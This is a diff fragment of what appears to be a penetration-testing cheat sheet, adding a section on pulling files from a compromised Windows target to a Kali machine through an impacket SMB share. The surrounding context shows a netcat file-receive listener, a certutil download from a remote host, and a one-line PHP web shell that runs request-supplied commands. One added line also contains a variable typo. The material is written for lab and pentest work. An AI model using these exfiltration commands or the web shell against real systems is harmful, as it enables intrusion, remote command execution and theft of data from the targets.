@@ -178,6 +178,23 @@ nc -lp 8888 > outfile
 ```
 certutil.exe -urlcache -split -f "$RHOST" outfile.zip
 ```
+
+### From Windows to local Kali machine using impacket-smbserver
+On local Kali machine:
+```
+sudo impacket-smbserver ShareName $(pwd)
+```
+Connect to newly created Share from Remote Windows target:
+```
+net use \\$LHOST\ShareName
+```
+Once connected to Share
+```
+copy $FILEPATH\file \\$LOST\ShareName
+```
+File should be copied from remote Windows target to local Kali machine at $(pwd)
+
+
 ## Simple PHP web shell
 ```
 <?php system($_REQUEST['cmd']); ?>
